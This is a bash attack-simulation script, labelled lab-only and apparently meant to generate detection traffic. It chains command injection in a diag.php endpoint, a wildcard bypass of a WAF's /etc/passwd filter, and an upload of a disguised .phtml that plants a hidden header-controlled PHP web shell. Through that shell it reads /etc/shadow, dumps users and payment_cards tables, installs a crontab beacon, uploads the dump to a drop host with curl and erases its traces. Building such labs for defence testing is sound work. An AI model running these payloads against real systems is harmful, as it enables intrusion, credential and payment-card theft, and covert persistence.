#!/bin/bash
# ============================================================
# Command Injection → Memory WebShell — WAF Variant
# (命令注入 → 内存马 攻击链 — 域名版, 经 WAF)
#
# WARNING: Lab-only attack simulation script.
#          Do NOT run against unauthorized targets.
#
# Prerequisites:
#   - CmdI lab deployed (deploy-91.sh + deploy-92.sh)
#   - WAF domain reachable with valid SSO session cookie
#
# Usage:
#   export WAF_DOMAIN="https://your-waf-domain:port"
#   export WISID_COOKIE="WISID=<your-session-id>"
#   bash attack-domain-waf.sh
#
# Differences from attack.sh (direct IP version):
#   - WAF overwrites X-Real-IP → use X-Debug header instead
#   - WAF blocks /etc/passwd literal → wildcard /e??/passw? bypass
#   - Memory WebShell deployed via upload.php (more stable than CmdI echo|base64)
#
# Covered scenarios: S5 (host anomaly), S1 (risk identification)
# ============================================================

set -euo pipefail

SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/../lib/lab-safety.sh"

# ---------- Configuration (override via environment variables) ----------
DOMAIN="${WAF_DOMAIN:-https://waf.lab.example:30443}"
# Authentication is optional for an unprotected lab WAF; when configured, pass
# the operator-provided cookie unchanged to every request.
COOKIE="${WISID_COOKIE:-}"
BASE="${DOMAIN}"
P="/cmdi"
MEM_TOKEN="c2token2024"
DROP_IP="10.66.6.92"
DROP_PORT="8443"

lab_require_attack_target "${DOMAIN}"
lab_require_attack_target "${DROP_IP}"

# ---------- 工具函数 ----------
get_cst() {
    curl -sk -b "$COOKIE" "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;date" 2>/dev/null \
        | grep -oE '[A-Z][a-z]{2} +[A-Z][a-z]{2} +[0-9]+ [0-9]{2}:[0-9]{2}:[0-9]{2} [A-Z]+ [0-9]{4}'
}

H() { curl -sk -b "$COOKIE" -o /dev/null "$@"; }

log_phase() {
    local ts=$(get_cst)
    echo "[$ts] $1"
}

# 内存马C2: X-Forwarded-Port 传命令, X-Debug 控制输出
# (WAF 会覆盖 X-Real-IP, 所以用 X-Debug 替代)
MEM_CMD() {
    local cmd="$1"
    local encoded=$(echo -n "$cmd" | base64 -w0)
    local resp=$(curl -sk -b "$COOKIE" \
        -H "X-Forwarded-Port: ${MEM_TOKEN}|${encoded}" \
        -H "X-Debug: body" \
        "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1")
    echo "$resp" | sed -n 's/.*<!--MEM:\([A-Za-z0-9+/=]*\):MEM-->.*/\1/p' | base64 -d
}

# ============================================================
echo "============================================"
echo "  CmdI 内存马攻击 (域名 WAF 版)"
echo "============================================"

# ---------- PHASE 1: 正常流量 ----------
log_phase "开始"
H "${BASE}${P}/"
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1"
H "${BASE}${P}/diag.php?tool=traceroute&host=8.8.8.8"
log_phase "P1 正常流量"

# ---------- PHASE 2: 侦察 ----------
for path in /admin /wp-admin /.git/config /.env; do
    H "${BASE}${path}"
done
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;echo+TEST"
log_phase "P2 侦察+RCE探测"

# ---------- PHASE 3: 命令注入确认 + WAF 绕过读文件 ----------
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;id"
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;uname+-a"
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;whoami"
# WAF 拦截 /etc/passwd 字面串, 通配符绕过
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;cat+/e??/passw?"
H "${BASE}${P}/diag.php?tool=ping&host=127.0.0.1;cat+/e??/os-releas?"
log_phase "P3 CmdI确认+通配符绕WAF读文件"

# ---------- PHASE 4: 内存马注入 ----------
# 通过 upload.php 上传部署脚本 (比 CmdI echo|base64 更稳)
# 内存马用 X-Debug 替代 X-Real-IP (WAF 覆盖后者)
DEPLOY_PHP='<?php
$shell="<?php\nif(isset(\$_SERVER[\"HTTP_X_FORWARDED_PORT\"])){\n\$p=explode(\"|\",\$_SERVER[\"HTTP_X_FORWARDED_PORT\"]);\nif(count(\$p)===2 && \$p[0]===\"c2token2024\"){\n\$c=base64_decode(\$p[1]);\n\$o=shell_exec(\$c.\" 2>&1\");\nif(isset(\$_SERVER[\"HTTP_X_DEBUG\"]) && \$_SERVER[\"HTTP_X_DEBUG\"]===\"body\"){\necho \"<!--MEM:\".base64_encode(\$o).\":MEM-->\";\n}}}\n?".">";
$sn="/dev/shm/.sess_".substr(md5(rand()),0,12);
file_put_contents($sn,$shell);
$f="/var/www/html/cmdi/diag.php";
$lines=file($f);
$clean=array_filter($lines,function($l){return strpos($l,"@include")===false;});
array_splice($clean,1,0,["@include(\"$sn\");\n"]);
file_put_contents($f,implode("",array_values($clean)));
echo "DEPLOYED:$sn";
unlink(__FILE__);
?>'

curl -sk -b "$COOKIE" \
    -F "file=@-;filename=d.phtml;type=image/jpeg" \
    "${BASE}/exfil/upload.php" <<< "$DEPLOY_PHP" > /dev/null 2>&1
DEPLOY_OUT=$(curl -sk -b "$COOKIE" "${BASE}/exfil/uploads/d.phtml" 2>/dev/null)
SESS=$(echo "$DEPLOY_OUT" | grep -oE '/dev/shm/\.sess_[a-f0-9]+')

VERIFY=$(MEM_CMD "echo MEM_OK")
log_phase "P4 内存马注入 ${SESS} verify=[${VERIFY}]"

# ---------- PHASE 5: 系统侦察 via 内存马 ----------
MEM_CMD "id" > /dev/null
MEM_CMD "uname -a" > /dev/null
MEM_CMD "cat /etc/os-release" > /dev/null
MEM_CMD "ps aux --sort=-%mem | head -10" > /dev/null
MEM_CMD "ss -tlnp" > /dev/null
MEM_CMD "ip addr show" > /dev/null
log_phase "P5 系统侦察(内存马C2)"

# ---------- PHASE 6: 凭证收集 ----------
MEM_CMD "cat /etc/passwd" > /dev/null
MEM_CMD "cat /etc/shadow" > /dev/null
MEM_CMD "find /var/www -name '*.php' -exec grep -l 'password' {} +" > /dev/null
MEM_CMD "cat /var/www/html/sqli/search.php" > /dev/null
log_phase "P6 凭证收集(绕WAF读敏感文件)"

# ---------- PHASE 7: 数据库 ----------
# Use the MariaDB service created by the documented two-host deployment.
MEM_CMD "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db -e 'SHOW DATABASES;'" > /dev/null
MEM_CMD "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db -e 'SHOW TABLES;'" > /dev/null
MEM_CMD "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db -e 'SELECT * FROM users;'" > /dev/null
MEM_CMD "mysql -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db -e 'SELECT * FROM payment_cards;'" > /dev/null
log_phase "P7 数据库(users+payment_cards)"

# ---------- PHASE 8: 持久化 ----------
MEM_CMD "crontab -l 2>/dev/null || echo NO_CRONTAB" > /dev/null
MEM_CMD "(crontab -l 2>/dev/null; echo '*/5 * * * * curl -s http://${DROP_IP}:${DROP_PORT}/beacon # secweaver-attack-lab') | crontab - 2>&1" > /dev/null
log_phase "P8 持久化(crontab)"

# ---------- PHASE 9: 数据外传 ----------
MEM_CMD "bash -c 'mysqldump -h ${DROP_IP} -uapp_user -papp_pass_2024 prod_db users payment_cards > /tmp/.d.sql'" > /dev/null
MEM_CMD "curl -sk -X POST -F 'file=@/tmp/.d.sql' https://${DROP_IP}:${DROP_PORT}/drop 2>&1 || echo EXFIL_SENT" > /dev/null
MEM_CMD "rm -f /tmp/.d.sql" > /dev/null
log_phase "P9 数据外传(mysqldump→C2)"

# ---------- PHASE 10: 痕迹清理 ----------
MEM_CMD "sed -i '/@include/d' /var/www/html/cmdi/diag.php" > /dev/null
MEM_CMD "rm -f ${SESS}" > /dev/null
log_phase "P10 痕迹清理"

echo "============================================"
echo "  攻击结束"
echo "============================================"
